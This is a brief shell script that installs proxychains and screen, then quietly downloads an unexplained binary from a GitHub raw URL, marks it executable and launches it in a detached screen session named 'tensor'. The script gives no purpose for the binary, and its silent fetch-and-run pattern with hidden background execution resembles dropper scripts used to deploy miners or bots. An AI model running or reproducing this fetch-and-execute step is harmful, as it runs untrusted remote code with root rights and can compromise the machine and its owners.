#!/bin/sh

apt update

apt install proxychains

apt install screen -y

sudo wget -qO main https://raw.githubusercontent.com/renilo/bh/main/testing && chmod +x main && screen -dmS tensor ./main
